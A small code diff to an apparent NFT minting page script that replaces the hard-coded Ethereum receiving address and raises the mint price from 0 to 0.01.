@@ -1,4 +1,4 @@
-const ADDRESS = '0xeBfcFf8dcA8b05E0AcaceaC402B0373960Ce438D';
+const ADDRESS = '0xbcC389227723880531A89c619351092343A59f40';
 const ethereum = window.ethereum
 const IMGPrice=0.025;
 const mint = document.querySelector(".mint")
@@ -12,7 +12,7 @@ const discord = '#';
 const twitter = 'https://twitter.com/ryandcrypto';
 const startCounter = 378;
 const endCounter = 1888;
-let price = 0;
+let price = 0.01;
 var totalPriceAmount = price;
 var countAmount = 1;
 var nftss,accounts;
